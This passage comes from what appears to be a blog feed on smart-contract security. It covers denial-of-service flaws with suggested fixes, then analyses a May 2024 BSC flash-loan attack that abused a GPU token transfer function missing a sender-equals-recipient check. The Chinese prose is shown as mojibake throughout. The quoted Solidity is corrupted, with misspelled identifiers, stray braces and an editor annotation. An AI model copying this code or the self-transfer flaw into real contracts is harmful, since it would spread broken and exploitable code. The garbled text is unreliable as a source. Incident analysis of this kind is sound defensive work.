æ®å¤§éƒ¨åˆ†ç”šè‡³å…¨éƒ¨çš„Gaså®¹é‡ï¼Œå¯¼è‡´å…¶ä»–ç”¨æˆ·çš„æ­£å¸¸äº¤æ˜“æ— æ³•è¢«ç¡®è®¤ï¼Œä»è€Œè¾¾åˆ°æ‹’ç»æœåŠ¡çš„æ•ˆæœã€‚<br>   2ï¼Œä½¿æ™ºèƒ½åˆçº¦è¿›å…¥æ— é™å¾ªç¯ï¼Œè¿™å°†å¯¼è‡´Gasç«‹å³è€—å°½ï¼Œäº¤æ˜“å¤±è´¥å¹¶å›æ»šã€‚è¿™ç§æ”»å‡»é€šå¸¸å‘ç”Ÿåœ¨åˆçº¦é€»è¾‘ä¸­å­˜åœ¨é”™è¯¯çš„æƒ…å†µä¸‹ï¼Œä¾‹å¦‚æ²¡æœ‰æ­£ç¡®å¤„ç†å¾ªç¯é€€å‡ºæ¡ä»¶ï¼Œæˆ–åœ¨é€’å½’è°ƒç”¨ä¸­ç¼ºå°‘ç»ˆæ­¢æ¡ä»¶ã€‚å½“åˆçº¦è¿›å…¥æ— é™å¾ªç¯æ—¶ï¼Œå®ƒä¼šå°è¯•æ¶ˆè€—æ‰€æœ‰å¯ç”¨çš„Gasï¼Œæœ€ç»ˆå¯¼è‡´äº¤æ˜“å¤±è´¥ï¼Œå¹¶å¯èƒ½ä½¿åˆçº¦å¤„äºä¸å¯ç”¨çŠ¶æ€ã€‚</p><h4 id="è§£å†³æ–¹æ³•ï¼š"><a href="#è§£å†³æ–¹æ³•ï¼š" class="headerlink" title="è§£å†³æ–¹æ³•ï¼š"></a>è§£å†³æ–¹æ³•ï¼š</h4><p>   ä½¿ç”¨callå‡½æ•°æ—¶å¯ä»¥è°ƒè¯•å‡ºæ‰§è¡Œæ“ä½œéœ€è¦çš„å¤§è‡´gasè´¹ç‡ï¼Œåœ¨callå‡½æ•°æŒ‡å®šç¨å¤§ä¸€äº›è´¹ç‡ï¼Œé¿å…æ”»å‡»å‘ç”Ÿã€‚</p><h3 id="ä¾èµ–å¤–éƒ¨çš„è°ƒç”¨è¿›å±•"><a href="#ä¾èµ–å¤–éƒ¨çš„è°ƒç”¨è¿›å±•" class="headerlink" title="ä¾èµ–å¤–éƒ¨çš„è°ƒç”¨è¿›å±•"></a>ä¾èµ–å¤–éƒ¨çš„è°ƒç”¨è¿›å±•</h3><h4 id="æ¼æ´åˆ†æï¼š-1"><a href="#æ¼æ´åˆ†æï¼š-1" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><pre><code>è¿™ç§æƒ…å†µæ˜¯ç”±äºåˆçº¦æ²¡æœ‰æ­£ç¡®å¤„ç†å¤–éƒ¨è°ƒç”¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåˆçº¦ä¾èµ–äºå¤–éƒ¨å‡½æ•°æ‰§è¡Œçš„ç»“æœï¼Œä½†åˆçº¦æ²¡æœ‰å¯¹å¤–éƒ¨å‡½æ•°æ‰§è¡Œå¤±è´¥è¿›è¡Œå¤„ç†ï¼Œæ­¤æ—¶å¦‚æœå¤–éƒ¨è°ƒç”¨å¤±è´¥æˆ–è€…ç”±äºå¤–éƒ¨åŸå› è€Œè¢«æ‹’ç»æ—¶ï¼Œä¼šå¯¼è‡´æ¯æ¬¡æ‰§è¡Œäº¤æ˜“æ—¶éƒ½ä¼šå› ä¸ºè¿™ä¸ªå¤±è´¥é—®é¢˜å¯¼è‡´äº¤æ˜“å›æ»šï¼Œåˆçº¦æ— æ³•ç»§ç»­æ‰§è¡Œã€‚</code></pre><h4 id="ä¸¾ä¾‹ï¼š"><a href="#ä¸¾ä¾‹ï¼š" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h4><p>   åœ¨ç«æ‹åˆçº¦ä¸­ï¼Œå‡ºä»·è€…é«˜æˆä¸ºkingï¼Œå¹¶æŠŠä¸Šä¸€ä½kingçš„é’±transferå›å»ï¼Œä½†æ˜¯å¦‚æœä¸Šä¸€ä½kingå¹¶ä¸èƒ½æ¥å—é’±çš„è¯,é‚£ä¹ˆä»–å°±ä¼šä¸€ç›´æˆä¸ºkingï¼Œå°±ç›¸å½“äºæ‹’ç»å…¶ä»–äººçš„å‡ºé«˜ä»·ç«æ‹</p><h4 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h4><p>   åœ¨ç«æ‹åˆçº¦ä¸­å°½é‡è®©åˆçº¦å‚ä¸è€…è‡ªæå‚ä¸ç«æ‹çš„tokenï¼Œå…¶æ¬¡å¦‚æœç¡®å®éœ€è¦å¯¹å¤–éƒ¨å‡½æ•°è°ƒç”¨çš„ç»“æœè¿›è¡Œå¤„ç†æ‰èƒ½è¿›å…¥æ–°çš„çŠ¶æ€ï¼Œè¯·è€ƒè™‘å¤–éƒ¨è°ƒç”¨å¯èƒ½ä¸€ç›´å¤±è´¥çš„æƒ…å†µï¼Œä¹Ÿå¯ä»¥æ·»åŠ åŸºäºæ—¶é—´çš„æ“ä½œï¼Œé˜²æ­¢å¤–éƒ¨å‡½æ•°è°ƒç”¨ä¸€ç›´æ— æ³•æ»¡è¶³requireåˆ¤æ–­ã€‚</p><h3 id="Ownerçš„é”™è¯¯æ“ä½œ"><a href="#Ownerçš„é”™è¯¯æ“ä½œ" class="headerlink" title="Ownerçš„é”™è¯¯æ“ä½œ"></a>Ownerçš„é”™è¯¯æ“ä½œ</h3><h4 id="æ¼æ´åˆ†æï¼š-2"><a href="#æ¼æ´åˆ†æï¼š-2" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><p>   è¿™ç§æ‹’ç»æœåŠ¡æ”»å‡»å°±æ˜¯å»ºç«‹åœ¨åæœŸè¿è¥æƒ…å†µä¸‹ï¼Œåœ¨æ™ºèƒ½åˆçº¦ä¸­é€šå¸¸ä¼šå­˜åœ¨ä»¥ Owner è´¦æˆ·ä½œä¸ºç®¡ç†å‘˜è§’è‰²ï¼Œè¯¥è§’è‰²é€šå¸¸ä¼šæŒæœ‰å¾ˆé«˜çš„æƒé™ï¼Œä¾‹å¦‚å¼€å¯æˆ–æš‚åœè½¬è´¦åŠŸèƒ½ï¼Œå½“ Owner è§’è‰²æ“ä½œå¤±è¯¯æˆ–ç§é’¥ä¸¢å¤±å¯èƒ½ä¼šå—åˆ°éä¸»è§‚æ„ä¹‰ä¸Šçš„æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p><h4 id="è§£å†³æ–¹æ³•ï¼š-1"><a href="#è§£å†³æ–¹æ³•ï¼š-1" class="headerlink" title="è§£å†³æ–¹æ³•ï¼š"></a>è§£å†³æ–¹æ³•ï¼š</h4><p>   å»ºè®®è®¾è®¡å¤šä¸ªowneråœ°å€ï¼Œé¿å…å¯†é’¥é—å¤±ç­‰é—®é¢˜å‘ç”Ÿæ—¶ï¼Œå¯¼è‡´åˆçº¦è¢«é”ï¼ŒåŒæ—¶ä¸€ä¸ªç»¼åˆç³»ç»Ÿä¸­åªæœ‰ä¸€ä¸ªç»å¯¹æƒé™çš„ç®¡ç†å‘˜æ˜¯æå…¶ä¸å®‰å…¨çš„ã€‚</p><h3 id="æ•°ç»„æˆ–æ˜ å°„è¿‡é•¿"><a href="#æ•°ç»„æˆ–æ˜ å°„è¿‡é•¿" class="headerlink" title="æ•°ç»„æˆ–æ˜ å°„è¿‡é•¿"></a>æ•°ç»„æˆ–æ˜ å°„è¿‡é•¿</h3><h4 id="æ¼æ´åˆ†æï¼š-3"><a href="#æ¼æ´åˆ†æï¼š-3" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><pre><code>å½“åˆçº¦ä¸­å­˜åœ¨å¯¹ä¼ å…¥çš„æ˜ å°„æˆ–æ•°ç»„å¾ªç¯éå†çš„é€»è¾‘ä¸”æ²¡æœ‰é™åˆ¶ä¼ å…¥çš„æ˜ å°„æˆ–æ•°ç»„çš„é•¿åº¦æ—¶æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¼ å…¥è¶…é•¿çš„æ˜ å°„æˆ–è€…æ•°ç»„è¿›è¡Œå¾ªç¯éå†è€Œå¤§é‡æ¶ˆè€— Gas ä»è€Œè¯¥ç¬”äº¤æ˜“çš„ Gas æº¢å‡ºï¼Œæœ€åä½¿å¾—æ™ºèƒ½åˆçº¦æš‚æ—¶æˆ–æ°¸ä¹…ä¸å¯æ“ä½œã€‚</code></pre><h4 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>  åœ¨åˆ©ç›Šåˆ†å‘åˆçº¦ä¸­ï¼Œç±»ä¼¼äºå…¬å¸ç»™è‚¡ä¸œåˆ†çº¢ï¼Œå¦‚æœå‘˜å·¥äººæ•°è¿‡äºå¤šï¼Œå³æ•°ç»„è¿‡å¤§ä¼šå¯¼è‡´æ“ä½œæ‰§è¡Œçš„gasè¿œè¿œè¶…äºä¸Šé™ï¼Œä»è€Œå¯¼è‡´äº¤æ˜“å¤±è´¥ï¼Œä¹Ÿå°±æ— æ³•åˆ†çº¢</p><h4 id="è§£å†³æ–¹æ³•ï¼š-2"><a href="#è§£å†³æ–¹æ³•ï¼š-2" class="headerlink" title="è§£å†³æ–¹æ³•ï¼š"></a>è§£å†³æ–¹æ³•ï¼š</h4><p>   é¿å…éœ€è¦å¾ªç¯æ“ä½œçš„æ•°ç»„æˆ–æ˜ å°„èƒ½å¤Ÿè¢«å¤–éƒ¨è°ƒç”¨ï¼ŒåŒæ—¶åœ¨åˆç†çš„å¢é•¿è¿‡ç¨‹ï¼Œå¯ä»¥é‡‡ç”¨åˆ†åŒºå—å¤„ç†çš„æ–¹å¼ï¼Œé¿å…æ•°ç»„æˆ–æ˜ å°„è¿‡å¤§å¤±è´¥ã€‚</p><h3 id="ä¾èµ–åº“çš„é—®é¢˜"><a href="#ä¾èµ–åº“çš„é—®é¢˜" class="headerlink" title="ä¾èµ–åº“çš„é—®é¢˜"></a>ä¾èµ–åº“çš„é—®é¢˜</h3><h4 id="æ¼æ´åˆ†æï¼š-4"><a href="#æ¼æ´åˆ†æï¼š-4" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><p>   ä¾èµ–å¤–éƒ¨çš„åˆçº¦åº“ã€‚å¦‚æœå¤–éƒ¨åˆçº¦çš„åº“è¢«åˆ é™¤ï¼Œé‚£ä¹ˆæ‰€æœ‰ä¾èµ–åº“çš„åˆçº¦æœåŠ¡éƒ½æ— æ³•ä½¿ç”¨ã€‚æœ‰äº›åˆçº¦ç”¨äºæ¥å—etherï¼Œå¹¶è½¬è´¦ç»™å…¶ä»–åœ°å€ã€‚ä½†æ˜¯ï¼Œè¿™äº›åˆçº¦æœ¬èº«å¹¶æ²¡æœ‰è‡ªå·±å®ç°ä¸€ä¸ªè½¬è´¦å‡½æ•°ï¼Œè€Œæ˜¯é€šè¿‡delegatecallå»è°ƒç”¨ä¸€äº›å…¶ä»–åˆçº¦ä¸­çš„è½¬è´¦å‡½æ•°å»å®ç°è½¬è´¦çš„åŠŸèƒ½ã€‚ä¸‡ä¸€è¿™äº›æä¾›è½¬è´¦åŠŸèƒ½çš„åˆçº¦æ‰§è¡Œsuicideæˆ–self-destructæ“ä½œçš„è¯ï¼Œé‚£ä¹ˆï¼Œé€šè¿‡delegatecallè°ƒç”¨è½¬è´¦åŠŸèƒ½çš„åˆçº¦å°±æœ‰å¯èƒ½å‘ç”Ÿetherè¢«å†»ç»“çš„æƒ…å†µ</p><h4 id="ä¸¾ä¾‹-1"><a href="#ä¸¾ä¾‹-1" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>  Parity é’±åŒ…é­å—çš„ç¬¬äºŒæ¬¡æ”»å‡»æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚Parity é’±åŒ…æä¾›äº†å¤šç­¾é’±åŒ…çš„åº“åˆçº¦ã€‚å½“åº“åˆçº¦çš„å‡½æ•°è¢« delegatecall è°ƒç”¨æ—¶ï¼Œå®ƒæ˜¯è¿è¡Œåœ¨è°ƒç”¨æ–¹ï¼ˆå³ï¼šç”¨æˆ·å¤šç­¾åˆçº¦ï¼‰çš„ä¸Šä¸‹æ–‡é‡Œï¼Œåƒ m_numOwners è¿™æ ·çš„å˜é‡éƒ½æ¥è‡ªäºç”¨æˆ·å¤šç­¾åˆçº¦çš„ä¸Šä¸‹æ–‡ã€‚å¦å¤–ï¼Œä¸ºäº†èƒ½è¢«ç”¨æˆ·åˆçº¦è°ƒç”¨ï¼Œè¿™äº›åº“åˆçº¦çš„åˆå§‹åŒ–å‡½æ•°éƒ½æ˜¯publicçš„ã€‚æ”»å‡»è€…å°±è°ƒç”¨åˆå§‹åŒ–å‡½æ•°æŠŠè‡ªå·±è®¾ç½®ä¸ºåº“å‡½æ•°çš„ownerï¼Œåœ¨è°ƒç”¨killï¼ˆï¼‰å‡½æ•°ï¼ŒæŠŠåº“åˆçº¦åˆ é™¤ï¼Œæ‰€æœ‰çš„etherå°±è¢«å†»ç»“äº†</p><h4 id="è§£å†³æ–¹æ³•ï¼š-3"><a href="#è§£å†³æ–¹æ³•ï¼š-3" class="headerlink" title="è§£å†³æ–¹æ³•ï¼š"></a>è§£å†³æ–¹æ³•ï¼š</h4><p>  ç»§æ‰¿åº“åˆçº¦åï¼Œå¯¹äºå¯ä»¥æ”¹å˜æŒ‡æ™ºèƒ½åˆçº¦å­˜å‚¨çŠ¶æ€çš„å‡½æ•°ï¼Œå°½é‡é‡‡å–é‡å†™çš„æ–¹å¼ï¼Œé¿å…è¢«æ¶æ„è°ƒç”¨ã€‚ç‰¹åˆ«æ˜¯ownerä¿®é¥°è¯ï¼Œè½¬è´¦å‡½æ•°ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20240508 BSCæ”»å‡»äº‹ä»¶åˆ†æ</title>
      <link href="/2024/09/29/20240508-BSC%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/09/29/20240508-BSC%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="BSCæ”»å‡»äº‹ä»¶åˆ†æ"><a href="#BSCæ”»å‡»äº‹ä»¶åˆ†æ" class="headerlink" title="BSCæ”»å‡»äº‹ä»¶åˆ†æ"></a>BSCæ”»å‡»äº‹ä»¶åˆ†æ</h2><p>è¿™æ˜¯ä¸€èµ·å‘ç”Ÿåœ¨2024å¹´5æœˆ8æ—¥å¸å®‰æ™ºèƒ½é“¾ï¼ˆBSCï¼‰ä¸Šçš„é—ªè´·æ”»å‡»äº‹ä»¶ï¼Œå½±å“çš„æ˜¯GPUä»£å¸åˆçº¦ã€‚è¯¥åˆçº¦å­˜åœ¨è‡ªè½¬è´¦æ¼æ´ï¼Œæ¯æ¬¡è‡ªè½¬è´¦éƒ½ä¼šå¯¼è‡´èµ„äº§ç¿»å€ã€‚é»‘å®¢åˆ©ç”¨è¯¥æ¼æ´ï¼Œé€šè¿‡DODOåè®®ä»¥é—ªè´·çš„æ–¹å¼å€Ÿå…¥BUSDï¼Œåœ¨PancakeSwapä¸Šå…‘æ¢æˆGPUä»£å¸ï¼Œå†åˆ©ç”¨æ¼æ´è¿›è¡Œå¤šæ¬¡è‡ªè½¬è´¦ï¼Œå¯¼è‡´å…¶GPUä»£å¸ä½™é¢å¢åŠ äº†100äº¿å€ï¼Œè¾¾åˆ°28,070,259,409,924æšä»£å¸ã€‚æœ€åï¼Œé»‘å®¢å°†GPUä»£å¸å–å‡ºæ¢æˆBUSDï¼Œç”¨äºå¿è¿˜é—ªè´·æœ¬æ¯ï¼Œæœ€ç»ˆçªƒå–çº¦3.2ä¸‡ç¾å…ƒèµ„é‡‘ã€‚</p><p>é¦–å…ˆæ”»å‡»è€…ä»DODOå€Ÿè´·åè®®ä¸­å‘èµ·é—ªç”µè´·ï¼Œå€Ÿå‡ºBUSDåˆ°æ”»å‡»åˆçº¦åœ°å€ï¼Œæ”»å‡»è€…åˆçº¦åœ¨è°ƒç”¨PancakeSwapåè®®ï¼Œå°†å€Ÿå‡ºçš„BUSDå…‘æ¢æˆGPUä»£å¸ï¼Œåˆ©ç”¨è‡ªæˆ‘è½¬è´¦æ¼æ´ï¼Œå‡­ç©ºäº§ç”ŸCPUä»£å¸ï¼Œæ”»å‡»è€…åˆçº¦è‡ªå·±ç»™è‡ªå·±è½¬è´¦ï¼Œæ¯è½¬è´¦ä¸€æ¬¡ï¼ŒGPUèµ„äº§å°±ä¼šç¿»å€ï¼Œæ”»å‡»è€…åˆçº¦å°†è·å–åˆ°çš„GPUä»£å¸å‘é€åˆ°PancakeSwap V2åè®®ä¸­ï¼Œæ¢å–BUSDã€‚ç„¶åæ”»å‡»è€…ä»PancakeSwap V2åè®®ä¸­è·å–çš„BUSDï¼Œå°†å…¶ä¸­çš„ä¸€éƒ¨åˆ†ç”¨äºè¿”è¿˜DODOå€Ÿè´·åè®®çš„æœ¬é‡‘å’Œåˆ©æ¯ï¼Œå‰©ä¸‹çš„éƒ½æ˜¯æ”»å‡»è€…æ‰€è·å¾—çš„ã€‚</p><p>å®Œæ•´çš„è°ƒç”¨ä¿¡æ¯çœ‹<a href="https://app.blocksec.com/explorer/tx/bsc/0x2c0ada695a507d7a03f4f308f545c7db4847b2b2c82de79e702d655d8c95dadb?line=6">è¿™é‡Œ</a></p><p>ä¸‹é¢æ˜¯DODOåè®®ä¸­å€Ÿè´·åè®®ä¸­çš„å€Ÿè´·å‡½æ•°<strong>flashLoan</strong>çš„éƒ¨åˆ†ä¿¡æ¯ï¼Œç”¨äºä»DODOåè®®èµ„é‡‘æ± ä¸­å€Ÿè´·æŒ‡å®šæ•°é‡çš„èµ„äº§ï¼Œè¿™é‡Œçš„å‚æ•°baseAmountä¸ºé›¶ï¼Œè€ŒquoteAmountä¸º226007ï¼Œè¡¨ç¤ºå€Ÿè´·è¿™ä¹ˆå¤šä¸ªBUSDï¼ŒassetToä¸ºæ”»å‡»è€…åˆçº¦åœ°å€ï¼Œdataåˆ™åœ¨å›è°ƒå‡½æ•°ä¸­ä½¿ç”¨åˆ°<br>ç®€å•çš„è®²è¯¥å‡½æ•°åˆ†ä¸º3ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€ä¸ªéƒ¨åˆ†è®²èµ„äº§å‘é€åˆ°ç›®æ ‡åœ°å€ï¼Œç¬¬äºŒéƒ¨åˆ†æ‰§è¡Œç›®æ ‡åœ°å€çš„å›è°ƒå‡½æ•°ï¼Œé€šå¸¸ç”¨äºå®ç°å¥—åˆ©é€»è¾‘ï¼Œç¬¬ä¸‰éƒ¨åˆ†æ ¡éªŒæ˜¯å¦å½’è¿˜æœ¬åˆ©æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(</span><br><span class="line">        uint256 baseAmount,</span><br><span class="line">        uint256 quoteAmount,</span><br><span class="line">        address assetTo,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external preventReentrant &#123;</span><br><span class="line">    // step1 transfer token to target address</span><br><span class="line">        _transferBaseOut(assetTo, baseAmount);</span><br><span class="line">        _transferQuoteOut(assetTo, quoteAmount);</span><br><span class="line"></span><br><span class="line">// step2 callback function</span><br><span class="line">        if (data.length &gt; 0)</span><br><span class="line">            IDODOCallee(assetTo).DPPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);</span><br><span class="line"></span><br><span class="line">        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));</span><br><span class="line">        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        // step3 check balance</span><br><span class="line">        require(</span><br><span class="line">            baseBalance &gt;= _BASE_RESERVE_ || quoteBalance &gt;= _QUOTE_RESERVE_,</span><br><span class="line">            &quot;FLASH_LOAN_FAILED&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // ...;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>PancakeRouter</strong>åˆçº¦ï¼Œè¯¥åˆçº¦ä¸»è¦ç”¨äºBUSDå’ŒGPUä»£å¸çš„å…‘æ¢ï¼Œç”±äºGPUåˆçº¦ä¼šåœ¨å…‘æ¢ç¯èŠ‚ä¸­æ”¶å–æ‰‹ç»­è´¹ï¼Œå…‘æ¢çš„å¦ä¸€ä¸ªä»£å¸æ•°é‡å¯èƒ½æ— æ³•æå‰å‡†ç¡®è®¡ç®—ï¼Œå› æ­¤è¿™é‡Œä½¿ç”¨äº†ä¸‹é¢çš„<strong>swapExactTokenForTokensSupportingFeeOnTransferTokendså‡½æ•°</strong>ï¼Œå‚æ•°<strong>amountln</strong>è¡¨ç¤ºå¾€æ± å­é‡Œå­˜å…¥çš„ä»£å¸æ•°é‡ï¼Œè€Œå‚æ•°<strong>amountOutMin</strong>è¡¨ç¤ºä»æ± å­é‡Œå–å‡ºæ¥å¦ä¸€ç§ä»£å¸çš„æœ€å°æ•°é‡ï¼Œ<strong>path</strong>ä»£è¡¨ä»£å¸çš„å…‘æ¢è·¯å¾„ï¼Œå¦‚ <strong>[address(A),address(B)]<strong>è¡¨ç¤ºAä»£å¸å…‘æ¢æˆBä»£å¸ï¼Œå‚æ•°</strong>to</strong> è¡¨ç¤ºå…‘æ¢å‡ºæ¥çš„ä»£å¸è½¬å…¥ç›®æ ‡åœ°å€ï¼Œ<strong>deadline</strong>ä¸ºå…‘æ¢æœ‰æ•ˆæ—¥æœŸ<br>è¯¥å‡½æ•°ç®€å•åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æŠŠAä»£å¸è½¬å…¥ç›¸åº”çš„æ± å­ä¸­ï¼Œç¬¬äºŒéƒ¨åˆ†é€šè¿‡**_swapSupportingFeeONTransferTokenså‡½æ•°<strong>è®¡ç®—Bä»£å¸çš„æ•°é‡å¹¶è½¬ç»™</strong>to<strong>åœ°å€ï¼Œç¬¬ä¸‰éƒ¨åˆ†åˆ¤æ–­å¾—åˆ°çš„Bä»£å¸æ•°é‡æ˜¯å¦æ»¡è¶³</strong>zamountOutMin**çš„è¦æ±‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">    uint amountIn,</span><br><span class="line">    uint amountOutMin,</span><br><span class="line">    address[] calldata path,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) external virtual override ensure(deadline) &#123;</span><br><span class="line">// step1 transfer A token to pool</span><br><span class="line">    TransferHelper.safeTransferFrom(</span><br><span class="line">        path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amountIn</span><br><span class="line">    );</span><br><span class="line">    uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);</span><br><span class="line">    </span><br><span class="line">    // step2 calculate and transfer B token</span><br><span class="line">    _swapSupportingFeeOnTransferTokens(path, to);</span><br><span class="line">    </span><br><span class="line">    // step3 check B token amount</span><br><span class="line">    require(</span><br><span class="line">        IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin,</span><br><span class="line">        &#x27;PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT&#x27;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GPUæ˜¯ä¸€ä¸ªæ™®é€šçš„ERC20ä»£å¸ï¼Œä»–çš„è½¬è´¦å‡½æ•°å¦‚ä¸‹ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰è¿›è¡Œ<strong>from</strong> å’Œ<strong>to</strong>çš„æ˜¯å¦ç›¸ç­‰çš„åˆ¤æ–­ï¼Œå®é™…çš„è½¬è´¦é€»è¾‘æ­£å‘ç”Ÿåœ¨çˆ¶åˆçº¦ä¸­ï¼Œæ­£æ˜¯å¦‚æ­¤ï¼Œè¿™ä¸ªæ¼æ´å¾ˆå°‘è¢«å‘ç°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(</span><br><span class="line">  address from, address to, uint256 amount) internal override &#123;</span><br><span class="line">   require(from != address(0)ï¼Œ&quot;ERC20: transfer from the zero address&quot;); require(to != address(0)ï¼Œ&quot;ERC20: transfer to the zero address&quot;); require(amount&gt;0);</span><br><span class="line">   &#125;</span><br><span class="line">   if(_isExcludedFromFeesVip[from] || _isExcludedFromFeesVip[tol])&#123;</span><br><span class="line">    super._transfer(from, to, amount);You, 2 days ago &quot; add demo</span><br><span class="line">      return;</span><br><span class="line">       if(super.balance0f(address(this)) &gt;super.balance0f(uniswapV2Pair).div(2000))&#123;</span><br><span class="line">           if (_isExcludedFromFees[from] || _isExcludedFromFees[tol]) &#123;&#125; else &#123;</span><br><span class="line">                if(_isPairs[from])&#123;</span><br><span class="line">                      require(startTime &lt; block.timestamp,&quot;startTime&quot;);</span><br><span class="line">                     if(startTime.add(18 * 30 *86400) &gt; block. timestamp)&#123;</span><br><span class="line">                     super._transfer(from, _destroyAddress, amount.div(100).mul (2)); super._transfer(from, address(this)ï¼Œamount.div(100).mul(1)); amount = amount.div(100).mul(97);</span><br><span class="line">                     &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€Œçˆ¶åˆçº¦çš„_<strong>tranfer</strong>å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰è¿›è¡Œ<strong>from</strong> å’Œ<strong>to</strong> æ˜¯å¦ç›¸ç­‰çš„æ£€æŸ¥ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(address sender,address recipient,uint256 amount )internal virtual &#123;</span><br><span class="line"></span><br><span class="line">       (requirelsender != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line"></span><br><span class="line">      (require(recipient != address(0),&quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">          uint256 senderAmount = _balances [sender];</span><br><span class="line"></span><br><span class="line">          uint256 recipientAmount = _balances [recipient];</span><br><span class="line"></span><br><span class="line">          (requirelsenderAmount &gt;= amount,&quot;ERC20:transfer amount exceeds balance&quot;);</span><br><span class="line">  </span><br><span class="line">          _balances [sender]= senderAmount. sub(amount);</span><br><span class="line"></span><br><span class="line">          _balances[recipient] = recipientAmount.add(amount);</span><br><span class="line"></span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä»¥ä¸Šä»£ç æˆ‘ä»¬å¯ä»¥çœ‹è§ï¼Œï¼Œåœ¨è¿›è¡Œ transfer æ—¶ï¼Œå…ˆä¿å­˜ from å’Œ to çš„ balance åˆ°å˜é‡ senderAmount å’Œ recipientAmountï¼Œéšåè®¡ç®—è½¬è´¦åçš„ senderAmount å’Œ recipientAmount çš„å€¼ï¼Œæœ€ååœ¨æ›´æ–°åˆ° balances ä¸­ã€‚ä½†æ˜¯ï¼Œå½“ from å’Œ to ä¸ºåŒä¸€åœ°å€æ—¶ï¼Œå…ˆæ›´æ–° from å†æ›´æ–° to å…¶å®å°±æ˜¯ç»™ to å‡­ç©ºæ·»åŠ äº† amount æ•°é‡çš„ tokenã€‚æ‰€ä»¥ï¼Œæ”»å‡»è€…é€šè¿‡æŒç»­ç»™è‡ªå·±è½¬è´¦ä»è€Œè®©è‡ªå·±çš„GPU Tokenå‡­ç©ºå¢å¤šã€‚</p><p>è¿™ä¸ªæ”»å‡»æˆåŠŸå°±æ˜¯åˆ©ç”¨äº†è‡ªæˆ‘è½¬è´¦çš„æ¼æ´ï¼Œæˆ‘è®¤ä¸ºè¦é˜²å¾¡çš„è¯åŠ ä¸ªå¯¹è½¬è´¦åœ°å€å’Œè¢«è½¬è´¦åœ°å€æ˜¯å¦ç›¸ç­‰çš„æ¡ä»¶</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web3å­¦ä¹ çŸ¥è¯†</title>
      <link href="/2024/09/29/web3%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/09/29/web3%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/</url>
      
